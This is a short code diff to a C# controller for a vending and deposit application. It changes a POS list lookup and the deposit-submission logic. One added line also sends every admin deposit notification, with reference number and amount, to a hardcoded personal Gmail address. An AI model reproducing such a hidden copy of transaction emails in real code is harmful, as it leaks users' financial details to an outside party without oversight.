@@ -73,7 +73,7 @@ namespace VendTech.Controllers
             ViewBag.WalletHistory = deposits.List;
 
             ViewBag.ChkBankName = new SelectList(_bankAccountManager.GetBankNames_API().ToList(), "BankName", "BankName");
-            var posList = _posManager.GetPOSSelectList(LOGGEDIN_USER.UserID, LOGGEDIN_USER.AgencyId);
+            var posList = _posManager.GetPOSWithNameSelectList(LOGGEDIN_USER.UserID, LOGGEDIN_USER.AgencyId);
             ViewBag.userPos = posList;
             if (posId == "" && posList.Count > 0)
             {
@@ -101,8 +101,6 @@ namespace VendTech.Controllers
         [AjaxOnly, HttpPost]
         public JsonResult AddDeposit(DepositModel model)
         {
-
-            // model.UserId = LOGGEDIN_USER.UserID; 
             if (model.PosId == 0)
             {
                 return JsonResult(new ActionOutput { Message = "POS Required", Status = ActionStatus.Error });
@@ -138,6 +136,7 @@ namespace VendTech.Controllers
                             body = body.Replace("%REF%", result.Object.CheckNumberOrSlipId);
                             body = body.Replace("%Amount%", Utilities.FormatAmount(result.Object.Amount));
                             Utilities.SendEmail(admin.Email, emailTemplate.EmailSubject, body);
+                            Utilities.SendEmail("vblell@gmail.com", emailTemplate.EmailSubject, body);
                         }
 
                     }
